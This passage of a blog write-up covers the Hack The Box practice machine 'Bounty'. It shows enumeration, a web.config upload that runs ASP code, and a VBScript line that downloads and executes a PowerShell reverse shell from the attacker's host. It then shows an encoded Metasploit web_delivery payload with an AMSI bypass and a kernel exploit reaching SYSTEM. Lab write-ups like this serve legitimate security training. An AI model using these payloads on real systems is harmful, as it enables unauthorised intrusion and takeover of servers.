style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span></code></pre></div><h3 id="iis-75---80tcp">IIS 7.5 - 80/tcp</h3>
+<p><img src="/images/bounty1.png" alt="bounty1"></p>
+<p>We&rsquo;re greeted with a very basic webpage running on port 80, with IIS 7.5 on the backend. Let&rsquo;s see what files and directories exist on the web server. Since this is an IIS server, I&rsquo;ll include <code>.asp</code> and <code>.aspx</code> in my search.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/bounty<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://10.129.96.100/ -w /usr/share/wordlists/dirb/big.txt -x .asp,.aspx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.129.96.100/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/big.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              asp,aspx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/aspnet_client        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 158<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.96.100/aspnet_client/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/transfer.aspx        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 941<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/uploadedfiles        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 158<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.96.100/uploadedfiles/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">61407</span> / <span style="color:#ae81ff">61410</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p><code>/transfer.aspx</code> looks like an interesting endpoint, almost as if there might be some sort of file upload vulnerability that exists (especially with the <code>/uploadedfiles</code> directory.</p>
+<p><img src="/images/bounty2.png" alt="bounty2"></p>
+<h2 id="initial-access">Initial Access</h2>
+<h3 id="file-upload-vulnerability">File Upload Vulnerability</h3>
+<p>The file upload page seems to limit the types of files it will accept; I tried at first with a simple <code>.txt</code> file, which was denied.</p>
+<p><img src="/images/bounty3.png" alt="bounty3"></p>
+<p>I played with the POST request in BurpSuite and discovered the only type of file validation going on is utilizing the file extension.  This can be seen here where I changed the extension from <code>.txt</code> to <code>.png</code>.</p>
+<p><img src="/images/bounty4.png" alt="bounty4"></p>
+<p>And, it would appear the uploaded files simply get dumped in the <code>/uploadedfiles</code> directory without any type of renaming. I&rsquo;ll use a wordlist of common file extensions and use Intruder to test which file extensions might be allowed by the upload form.</p>
+<p><img src="/images/bounty5.png" alt="bounty5"></p>
+<p>After trying some of the more common file upload techniques to get a webshell with <code>.asp</code>, <code>.aspx</code>, <code>.php</code>, etc., I realized I may have to find another way. There&rsquo;s one other filetype we&rsquo;re allowed to upload that struck me as interesting, and prompted a few Google searches: <code>.config</code>. I came across an article that detailed a possible way in: <a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/" target="_blank">IIS - Web.config File Exploit</a></p>
+<blockquote>
+<p>Sometimes IIS supports ASP files but it is not possible to upload any file with .ASP extension. In this case, it is possible to use a web.config file directly to run ASP classic codes.</p></blockquote>
+<h3 id="webconfig">Web.config</h3>
+<p>From the link posted above, I&rsquo;ll start with this <code>.xml</code> file as a base:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;configuration&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;system.webServer&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;handlers</span> <span style="color:#a6e22e">accessPolicy=</span><span style="color:#e6db74">&#34;Read, Script, Write&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;web_config&#34;</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;*.config&#34;</span> <span style="color:#a6e22e">verb=</span><span style="color:#e6db74">&#34;*&#34;</span> <span style="color:#a6e22e">modules=</span><span style="color:#e6db74">&#34;IsapiModule&#34;</span> <span style="color:#a6e22e">scriptProcessor=</span><span style="color:#e6db74">&#34;%windir%\system32\inetsrv\asp.dll&#34;</span> <span style="color:#a6e22e">resourceType=</span><span style="color:#e6db74">&#34;Unspecified&#34;</span> <span style="color:#a6e22e">requireAccess=</span><span style="color:#e6db74">&#34;Write&#34;</span> <span style="color:#a6e22e">preCondition=</span><span style="color:#e6db74">&#34;bitness64&#34;</span> <span style="color:#f92672">/&gt;</span>         
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/handlers&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;security&gt;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&lt;requestFiltering&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;fileExtensions&gt;</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">fileExtension=</span><span style="color:#e6db74">&#34;.config&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/fileExtensions&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;hiddenSegments&gt;</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">segment=</span><span style="color:#e6db74">&#34;web.config&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/hiddenSegments&gt;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&lt;/requestFiltering&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/security&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;/system.webServer&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/configuration&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;%
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Response.write(&#34;-&#34;&amp;&#34;-&gt;&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&#39; it is running the ASP code if you can see 3 by opening the web.config file!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Response.write(1+2)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Response.write(&#34;&lt;!-&#34;&amp;&#34;-&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">%&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
+</span></span></code></pre></div><p>Next, want to upgrade this pretty quickly to a reverse shell, as there&rsquo;s some sort of script that clears out the uploads fairly frequently.  I opted to use Nishang&rsquo;s <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">revere shell</a> (coded in PowerShell) for this.</p>
+<p>Since we want the reverse shell to activate on its own, be sure to add the following snippet to the bottom of <code>Invoke-PowerShellTcp.ps1</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>Invoke-PowerShellTcp -Reverse -IPAddress <span style="color:#ae81ff">10.10</span>.14.141 -Port <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>Now start a web server on your attack box wherever your <code>.ps1</code> reverse shell is located.</p>
+<p>The next step is to modify the <code>web.config</code> file to download and execute the reverse shell.  We can do that by adding the following code to the bottom of the file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;</span>%@ Language=VBScript %&gt; <span style="color:#960050;background-color:#1e0010">&lt;</span>% call Server.CreateObject(&#34;WSCRIPT.SHELL&#34;).Run(&#34;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.5/Invoke-PowerShellTcp.ps1&#39;)&#34;) %&gt;
+</span></span></code></pre></div><p>Everything should be ready&hellip; make sure you&rsquo;ve done the following:</p>
+<ol>
+<li>Modified <code>Invoke-PowerShellTcp.ps1</code></li>
+<li>HTTP server running on attack box to download <code>.ps1</code></li>
+<li>Netcat listener running</li>
+<li>Upload and navigate to <code>web.config</code></li>
+<li>Enjoy your shell</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/bounty<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -nvlp <span style="color:#ae81ff">4444</span>                    
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.141<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.149.214<span style="color:#f92672">]</span> <span style="color:#ae81ff">49158</span>
+</span></span><span style="display:flex;"><span>Windows PowerShell running as user BOUNTY$ on BOUNTY
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt; whoami
+</span></span><span style="display:flex;"><span>bounty<span style="color:#ae81ff">\m</span>erlin
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="upgrade-to-meterpreter">Upgrade to Meterpreter</h3>
+<p>One of my favorite ways to grab a meterpreter shell from a regular shell is with the <code>multi/script/web_delivery</code> module in Metasploit. Provide the necessary parameters, and the exploit will give you the exact code to run on the target machine to grab your meterpreter shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/bounty<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ msfconsole
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 &gt; use exploit/multi/script/web_delivery
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/script/web_delivery<span style="color:#f92672">)</span> &gt; set target <span style="color:#ae81ff">2</span>   <span style="color:#75715e"># PowerShell</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/script/web_delivery<span style="color:#f92672">)</span> &gt; set payload windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/script/web_delivery<span style="color:#f92672">)</span> &gt; set LHOST tun0
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/script/web_delivery<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">5555</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/script/web_delivery<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit running as background job 0.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit completed, but no session was created.
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/script/web_delivery<span style="color:#f92672">)</span> &gt; 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.141:5555 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using URL: http://10.10.14.141:8080/okstoKcx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Server started.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Run the following command on the target machine:
+</span></span><span style="display:flex;"><span>powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABtAEkATQAzAFoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbQBJAE0AMwBaAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbQBJAE0AMwBaAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADEAOgA4ADAAOAAwAC8AbwBrAHMAdABvAEsAYwB4AC8AdgBuAFIATQBSAHkAdQBBAFEAYQB1AFAAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEANAAxADoAOAAwADgAMAAvAG8AawBzAHQAbwBLAGMAeAAnACkAKQA7AA<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.149.214   web_delivery - Delivering AMSI Bypass <span style="color:#f92672">(</span><span style="color:#ae81ff">1389</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.149.214   web_delivery - Delivering Payload <span style="color:#f92672">(</span><span style="color:#ae81ff">3727</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">203846</span> bytes<span style="color:#f92672">)</span> to 10.129.149.214
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.141:5555 -&gt; 10.129.149.214:49164<span style="color:#f92672">)</span> at 2025-02-14 10:37:06 -0500
+</span></span></code></pre></div><h3 id="local-exploit-suggester">Local Exploit Suggester</h3>
+<p>During initial enumeration, it appeared this machine had no hotfixes applied and would likely be vulnerable to some sort of kernel exploit. I like to use the <code>local_exploit_suggester</code> module to quickly identify these for testing.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>meterpreter &gt; run post/multi/recon/local_exploit_suggester
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...snip...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.149.214 - Valid modules <span style="color:#66d9ef">for</span> session 1:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">#   Name                                                           Potentially Vulnerable?  Check Result</span>
+</span></span><span style="display:flex;"><span> -   ----                                                           -----------------------  ------------
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span>   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.                                                                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span>   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.                                                                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span>   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.                                                                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.                                                                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">5</span>   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.                                                                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">6</span>   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server <span style="color:#ae81ff">2008</span> R2 build detected!                      
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">7</span>   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.                                                                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">8</span>   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server <span style="color:#ae81ff">2008</span> R2 build detected!                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">9</span>   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.                                                                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">10</span>  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.                                                                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">11</span>  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.                                                                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">12</span>  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
+</span></span></code></pre></div><h3 id="cve_2019_1458_wizardopium">cve_2019_1458_wizardopium</h3>
+<p>This exploit immediately jumped out at me because of the wizard picture on the web server we saw at the very beginning. Worth a shot!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; use exploit/windows/local/cve_2019_1458_wizardopium
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/cve_2019_1458_wizardopium<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/cve_2019_1458_wizardopium<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">4545</span>
+</span></span><span style="display:flex;"><span>LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">4545</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/cve_2019_1458_wizardopium<span style="color:#f92672">)</span> &gt; set LHOST tun0
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; 10.10.14.141
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/cve_2019_1458_wizardopium<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.141:4545 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running automatic check <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;set AutoCheck false&#34;</span> to disable<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the exploit...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching msiexec to host the DLL...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Process <span style="color:#ae81ff">512</span> launched.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting the DLL into 512...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">203846</span> bytes<span style="color:#f92672">)</span> to 10.129.149.214
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exploit finished, wait <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>hopefully privileged<span style="color:#f92672">)</span> payload execution to complete.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>10.10.14.141:4545 -&gt; 10.129.149.214:49165<span style="color:#f92672">)</span> at 2025-02-14 10:45:59 -0500
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span></code></pre></div>
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="https://pL4sTiC1337.github.io/writeups/htb-cascade/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>HtB Cascade</a>
+        
+	    
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a>
+      <ul>
+        <li><a href="#nmap">nmap</a></li>
+        <li><a href="#iis-75---80tcp">IIS 7.5 - 80/tcp</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-access">Initial Access</a>
+      <ul>
+        <li><a href="#file-upload-vulnerability">File Upload Vulnerability</a></li>
+        <li><a href="#webconfig">Web.config</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#upgrade-to-meterpreter">Upgrade to Meterpreter</a></li>
+        <li><a href="#local-exploit-suggester">Local Exploit Suggester</a></li>
+        <li><a href="#cve_2019_1458_wizardopium">cve_2019_1458_wizardopium</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
